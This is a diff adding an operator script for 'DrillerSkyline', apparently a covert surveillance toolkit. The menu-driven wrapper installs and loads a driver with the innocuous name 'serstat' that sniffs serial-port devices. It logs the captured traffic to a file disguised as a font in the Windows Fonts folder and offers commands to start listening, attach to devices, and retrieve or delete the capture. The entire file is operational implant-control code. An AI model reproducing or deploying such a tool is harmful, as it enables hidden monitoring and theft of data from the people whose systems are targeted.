@@ -1,0 +1,327 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of DrillerSkyline
+#
+# Modifications:
+#  12/15/06	Stolen from DoorwayNapkin/Install.eps.
+#--------------------------------------------------------
+@include "_DriverIncludes.epm";
+@include "_GetSystemVersion.epm";
+@include "_RecordToolUse.epm";
+
+@echo off;
+
+# defaults
+string $driverName  = "serstat";
+string $captureFile = "\\SystemRoot\\Fonts\\vga_drsk.tff";
+string $version     = "DrillerSkyline 1.0.0.3";
+
+_RecordToolUse("DrillerSkyline", $version);
+
+#commands
+int $installCmdsStart;
+int $normalCmdsStart;
+int $controlCmdsStart;
+int $captureCmdsStart;
+string $commands;
+$commands[0] = "Quit";
+
+#start of install commands
+$installCmdsStart = 1;
+$commands[1] = "Change driver name";
+$commands[2] = "Change capture file";
+$commands[3] = "Install Tools";
+$commands[4] = "Uninstall Tools";
+$commands[5] = "Load driver";
+$commands[6] = "Unload driver";
+$commands[7] = "Verify install";
+$commands[8] = "Verify driver is running";
+
+#start of config commands
+$normalCmdsStart = 9;
+$commands[9] = "Get current status";
+$commands[10] = "Set capture file maximum size";
+$commands[11] = "Attach New Device";
+$commands[12] = "Detach Device";
+
+#start of control commands
+$controlCmdsStart = 13;
+$commands[13] = "Disconnect from all devices";
+$commands[14] = "Reconnect to all devices";
+$commands[15] = "Stop listening";
+$commands[16] = "Start listening";
+
+#start of capture file commands
+$captureCmdsStart = 17;
+$commands[17] = "Retrieve capture file";
+$commands[18] = "Delete capture file";
+
+while (true) {
+	echo "\r\n\r\n";
+	
+	# Print the current configuration
+	echo "Current configuration:";
+	echo "\t Driver Name : $driverName";
+	echo "\tCapture File : $captureFile";
+	echo "";
+	
+	# print the command list
+	int $i = 0;
+	while ($i < sizeof($commands)) {
+		if($i == $installCmdsStart) {
+			echo "";
+			echo "Installation commands:";
+		} else if ($i == $normalCmdsStart) {
+			echo "";
+			echo "Configuration commands";
+		} else if ($i == $controlCmdsStart) {
+			echo "";
+			echo "Control commands:";
+		} else if ($i == $captureCmdsStart) {
+			echo "";
+			echo "Capture File commands:";
+		}
+		echo "($i). $commands[$i]";
+		$i++;
+	}
+	echo "";
+	
+	int $choice = GetInput("Enter the desired option");
+	bool $retVal = false;
+	if ($choice == 0) {
+		return true;
+	} else if($choice == 1) {
+		$retVal = ChangeDriverName($driverName, $captureFile);
+	} else if($choice == 2) {
+		$retVal = ChangeCaptureFile($driverName, $captureFile);
+	} else if($choice == 3) {
+		$retVal = InstallTools($driverName, $captureFile);
+	} else if($choice == 4) {
+		$retVal = UninstallTools($driverName, $captureFile);
+	} else if($choice == 5) {
+		$retVal = LoadDriver($driverName, $captureFile);
+	} else if($choice == 6) {
+		$retVal = UnloadDriver($driverName, $captureFile);
+	} else if($choice == 7) {
+		$retVal = VerifyInstall($driverName, $captureFile);
+	} else if($choice == 8) {
+		$retVal = VerifyDriverIsRunning($driverName, $captureFile);
+	} else if($choice == 9) {
+		$retVal = GetCurrentStatus($driverName, $captureFile);
+	} else if($choice == 10) {
+		$retVal = SetCaptureFileMaximumSize($driverName, $captureFile);
+	} else if($choice == 11) {
+		$retVal = Attach($driverName, $captureFile);
+	} else if($choice == 12) {
+		$retVal = Detach($driverName, $captureFile);
+	} else if($choice == 13) {
+		$retVal = Disconnect($driverName, $captureFile);
+	} else if($choice == 14) {
+		$retVal = Reconnect($driverName, $captureFile);
+	} else if($choice == 15) {
+		$retVal = StopListening($driverName, $captureFile);
+	} else if($choice == 16) {
+		$retVal = StartListening($driverName, $captureFile);
+	} else if($choice == 17) {
+		$retVal = RetrieveCaptureFile($driverName, $captureFile);
+	} else if($choice == 18) {
+		$retVal = DeleteCaptureFile($driverName, $captureFile);
+	} else {
+		echo "*** Invalid choice ***";
+	}
+	pause;
+}
+# shouldn't get here
+return false;
+
+
+##-------------------------------------------------------------------##
+sub ChangeDriverName(REF string $driverName, REF string $captureFile) {
+	echo "Current driver name = '$driverName'";
+	$driverName = GetInput("Enter new driver name");
+	return true;
+}
+
+##-------------------------------------------------------------------##
+sub ChangeCaptureFile(REF string $driverName, REF string $captureFile) {
+	echo "Current capture file is '$captureFile'";
+	string $temp = GetInput("Enter new capture file path");
+	
+	echo "Setting capture file to '$temp'";
+#	@echo on;
+	bool $ret = `serialsniffer -driver $driverName -setlogfile $temp`;
+#	@echo off;
+	if($ret) {
+		echo "    SUCCESS";
+		if(prompt "Do you wish to switch to the new file now? (requires stop and start)") {
+			if(StopListening($driverName, $captureFile)) {
+				StartListening($driverName, $captureFile);
+			} else {
+				echo "**** Stop failed";
+			}
+		}
+		$captureFile = $temp;
+	} else {
+		echo "    FAILED";
+		if(prompt "Are you sure you wish to change the local record of the capture file?") {
+			$captureFile = $temp;
+		}
+	}
+	
+	return $ret;
+}
+
+##-------------------------------------------------------------------##
+sub InstallTools(REF string $driverName, REF string $captureFile) {
+	if(`script DrillerSkyline\\Install.eps $driverName "$captureFile"`) {
+		echo "INSTALL SUCCESS";
+		echo "";
+		echo "NOTE:  The driver has not been loaded";
+		return true;
+	} else {
+		echo "**** INSTALL FAILED ****";
+		return false;
+	}
+}
+
+##-------------------------------------------------------------------##
+sub UninstallTools(REF string $driverName, REF string $captureFile) {
+	if(`script DrillerSkyline\\Uninstall.eps $driverName`) {
+		echo "UNINSTALL SUCCESS";
+		echo "";
+		echo "**** NOTE:  The capture file must be deleted seperately ****";
+		return true;
+	} else {
+		echo "**** UNINSTALL FAILED ****";
+		return false;
+	}
+}
+
+##-------------------------------------------------------------------##
+sub LoadDriver(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Load the driver ($driverName)?") {
+		@echo on;
+		$retVal = `driverload -name $driverName`;
+		@echo off;
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub UnloadDriver(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Unload the driver ($driverName)?") {
+		@echo on;
+		$retVal = `driverunload -name $driverName`;
+		@echo off;
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub VerifyInstall(REF string $driverName, REF string $captureFile) {
+	if (`script DrillerSkyline\\VerifyInstall.eps $driverName`) {
+	    echo "VERIFICATION SUCCESSFULL";
+	    return true;
+	} else {
+	    echo "**** UNABLE TO VERIFY INSTALL ****";
+	    return false;
+	}
+}
+
+##-------------------------------------------------------------------##
+sub VerifyDriverIsRunning(REF string $driverName, REF string $captureFile) {
+	if (`script DrillerSkyline\\VerifyRunning.eps $driverName`) {
+	    echo "VERIFICATION SUCCESSFUL";
+	} else {
+	    echo "**** UNABLE TO VERIFY DRIVER IS RUNNING ****";
+	}
+}
+
+##-------------------------------------------------------------------##
+sub GetCurrentStatus(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\GetStatus.eps $driverName`;
+}
+
+##-------------------------------------------------------------------##
+sub SetCaptureFileMaximumSize(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\SetMaxFileSize.eps $driverName`;
+}
+
+##-------------------------------------------------------------------##
+sub Disconnect(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Disconnect from all devices? (Reconnecting to some might require a reboot...)") {
+		if(`serialsniffer -driver $driverName -disconnect`) {
+			echo "    SUCCESS";
+			$retVal = true;
+		} else {
+			echo "    FAILED";
+		}
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub Reconnect(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Attempt to connect to all devices?") {
+		if(`serialsniffer -driver $driverName -reconnect`) {
+			echo "    SUCCESS";
+			$retVal = true;
+		} else {
+			echo "    FAILED";
+		}
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub StopListening(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Stop listening to all devices?") {
+		if(`serialsniffer -driver $driverName -stopListening`) {
+			echo "    SUCCESS";
+			$retVal = true;
+		} else {
+			echo "    FAILED";
+		}
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub StartListening(REF string $driverName, REF string $captureFile) {
+	bool $retVal = false;
+	if(prompt "Resume listening on all devices?") {
+		if(`serialsniffer -driver $driverName -startListening`) {
+			echo "    SUCCESS";
+			$retVal = true;
+		} else {
+			echo "    FAILED";
+		}
+	}
+	return $retVal;
+}
+
+##-------------------------------------------------------------------##
+sub RetrieveCaptureFile(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\HandleCapture.eps $driverName get "$captureFile"`;
+}
+
+##-------------------------------------------------------------------##
+sub DeleteCaptureFile(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\HandleCapture.eps $driverName delete "$captureFile"`;
+}
+
+##-------------------------------------------------------------------##
+sub Detach(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\Detach.eps $driverName`;
+}
+
+##-------------------------------------------------------------------##
+sub Attach(REF string $driverName, REF string $captureFile) {
+	return `script DrillerSkyline\\Attach.eps $driverName`;
+}
